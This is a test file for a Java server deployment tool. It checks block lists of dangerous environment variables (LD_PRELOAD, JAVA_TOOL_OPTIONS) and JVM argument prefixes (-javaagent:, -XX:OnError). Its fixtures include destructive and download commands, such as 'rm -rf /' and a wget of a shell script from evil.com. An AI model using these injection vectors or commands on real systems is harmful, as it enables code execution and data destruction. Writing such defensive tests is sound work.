/**
 * Exhaustive test suite: Security policy, blocked env keys, blocked VM args
 *
 * Tests the security boundaries defined in constants.ts:
 * - BLOCKED_ENV_KEYS (LD_PRELOAD, DYLD_INSERT_LIBRARIES, etc.)
 * - BLOCKED_VMARGS_PREFIXES (-javaagent:, -agentlib:, etc.)
 *
 * Also tests SecurityPolicy from @core/policy/SecurityPolicy
 */

import { describe, it, expect } from 'vitest';
import {
  BLOCKED_ENV_KEYS,
  BLOCKED_VMARGS_PREFIXES,
  DEPLOY_NAME_PATTERN,
} from '../../constants';

/* ══════════════════════════════════════════════════════════════════════════
 * BLOCKED_ENV_KEYS tests
 * ══════════════════════════════════════════════════════════════════════════ */

describe('BLOCKED_ENV_KEYS', () => {
  it('should block LD_PRELOAD', () => {
    expect(BLOCKED_ENV_KEYS.has('LD_PRELOAD')).toBe(true);
  });

  it('should block DYLD_INSERT_LIBRARIES', () => {
    expect(BLOCKED_ENV_KEYS.has('DYLD_INSERT_LIBRARIES')).toBe(true);
  });

  it('should block JAVA_TOOL_OPTIONS', () => {
    expect(BLOCKED_ENV_KEYS.has('JAVA_TOOL_OPTIONS')).toBe(true);
  });

  it('should block _JAVA_OPTIONS', () => {
    expect(BLOCKED_ENV_KEYS.has('_JAVA_OPTIONS')).toBe(true);
  });

  it('should block JDK_JAVA_OPTIONS', () => {
    expect(BLOCKED_ENV_KEYS.has('JDK_JAVA_OPTIONS')).toBe(true);
  });

  it('should NOT block normal env keys', () => {
    expect(BLOCKED_ENV_KEYS.has('PATH')).toBe(false);
    expect(BLOCKED_ENV_KEYS.has('HOME')).toBe(false);
    expect(BLOCKED_ENV_KEYS.has('CATALINA_HOME')).toBe(false);
    expect(BLOCKED_ENV_KEYS.has('JAVA_HOME')).toBe(false);
  });

  it('should be case-sensitive (lowercase not blocked)', () => {
    expect(BLOCKED_ENV_KEYS.has('ld_preload')).toBe(false);
    expect(BLOCKED_ENV_KEYS.has('java_tool_options')).toBe(false);
  });
});

/* ══════════════════════════════════════════════════════════════════════════
 * BLOCKED_VMARGS_PREFIXES tests
 * ══════════════════════════════════════════════════════════════════════════ */

describe('BLOCKED_VMARGS_PREFIXES', () => {
  it('should contain javaagent prefix', () => {
    expect(BLOCKED_VMARGS_PREFIXES).toContain('-javaagent:');
  });

  it('should contain agentlib prefix', () => {
    expect(BLOCKED_VMARGS_PREFIXES).toContain('-agentlib:');
  });

  it('should contain agentpath prefix', () => {
    expect(BLOCKED_VMARGS_PREFIXES).toContain('-agentpath:');
  });

  it('should contain OnOutOfMemoryError prefix', () => {
    expect(BLOCKED_VMARGS_PREFIXES).toContain('-XX:OnOutOfMemoryError');
  });

  it('should contain OnError prefix', () => {
    expect(BLOCKED_VMARGS_PREFIXES).toContain('-XX:OnError');
  });

  describe('should match dangerous VM args', () => {
    const dangerous = [
      '-javaagent:/tmp/evil.jar',
      '-agentlib:jdwp=transport=dt_socket',
      '-agentpath:/tmp/agent.so',
      '-XX:OnOutOfMemoryError="rm -rf /"',
      '-XX:OnError="wget http://evil.com/shell.sh"',
    ];

    for (const arg of dangerous) {
      it(`should match: ${arg}`, () => {
        const blocked = BLOCKED_VMARGS_PREFIXES.some(prefix => arg.startsWith(prefix));
        expect(blocked).toBe(true);
      });
    }
  });

  describe('should NOT match safe VM args', () => {
    const safe = [
      '-Xmx512m',
      '-Xms256m',
      '-XX:MaxPermSize=256m',
      '-Djava.library.path=/usr/lib',
      '-server',
      '-verbose:gc',
      '-Dfile.encoding=UTF-8',
    ];

    for (const arg of safe) {
      it(`should NOT match: ${arg}`, () => {
        const blocked = BLOCKED_VMARGS_PREFIXES.some(prefix => arg.startsWith(prefix));
        expect(blocked).toBe(false);
      });
    }
  });

  describe('Case sensitivity and edge cases', () => {
    it('should be case-sensitive (uppercase not blocked)', () => {
      const blocked = BLOCKED_VMARGS_PREFIXES.some(p => '-JAVAAGENT:/evil.jar'.startsWith(p));
      expect(blocked).toBe(false);
    });

    it('should match prefix exactly (not just startsWith after colon)', () => {
      const blocked = BLOCKED_VMARGS_PREFIXES.some(p => '-javaagent'.startsWith(p));
      // '-javaagent' does NOT start with '-javaagent:' (note the colon)
      expect(blocked).toBe(false);
    });

    it('should match even with empty value after prefix', () => {
      const blocked = BLOCKED_VMARGS_PREFIXES.some(p => '-javaagent:'.startsWith(p));
      expect(blocked).toBe(true);
    });
  });
});

/* ══════════════════════════════════════════════════════════════════════════
 * SecurityPolicy (core) — if it exists
 * ══════════════════════════════════════════════════════════════════════════ */

let SecurityPolicy: any;
try {
  SecurityPolicy = (await import('@core/policy/SecurityPolicy')).SecurityPolicy;
} catch {
  SecurityPolicy = null;
}

describe('SecurityPolicy', () => {
  if (!SecurityPolicy) {
    it.skip('SecurityPolicy module not found — skipping', () => {});
    return;
  }

  let policy: any;

  beforeEach(() => {
    policy = new SecurityPolicy();
  });

  describe('validateEnv', () => {
    it('should accept empty env', () => {
      const result = policy.validateEnv({});
      expect(result.ok).toBe(true);
    });

    it('should accept safe env vars', () => {
      const result = policy.validateEnv({ CATALINA_HOME: '/opt/tomcat', JAVA_HOME: '/opt/java' });
      expect(result.ok).toBe(true);
    });

    it('should reject LD_PRELOAD', () => {
      const result = policy.validateEnv({ LD_PRELOAD: '/tmp/evil.so' });
      expect(result.ok).toBe(false);
    });

    it('should reject DYLD_INSERT_LIBRARIES', () => {
      const result = policy.validateEnv({ DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib' });
      expect(result.ok).toBe(false);
    });

    it('should reject JAVA_TOOL_OPTIONS', () => {
      const result = policy.validateEnv({ JAVA_TOOL_OPTIONS: '-javaagent:evil.jar' });
      expect(result.ok).toBe(false);
    });
  });

  describe('validateVmArgs', () => {
    it('should accept empty args', () => {
      const result = policy.validateVmArgs([]);
      expect(result.ok).toBe(true);
    });

    it('should accept safe args', () => {
      const result = policy.validateVmArgs(['-Xmx512m', '-server']);
      expect(result.ok).toBe(true);
    });

    it('should reject -javaagent:', () => {
      const result = policy.validateVmArgs(['-javaagent:/evil.jar']);
      expect(result.ok).toBe(false);
    });

    it('should reject -XX:OnOutOfMemoryError', () => {
      const result = policy.validateVmArgs(['-XX:OnOutOfMemoryError=rm -rf /']);
      expect(result.ok).toBe(false);
    });

    it('should reject even when mixed with safe args', () => {
      const result = policy.validateVmArgs(['-Xmx512m', '-agentlib:jdwp', '-server']);
      expect(result.ok).toBe(false);
    });
  });
});
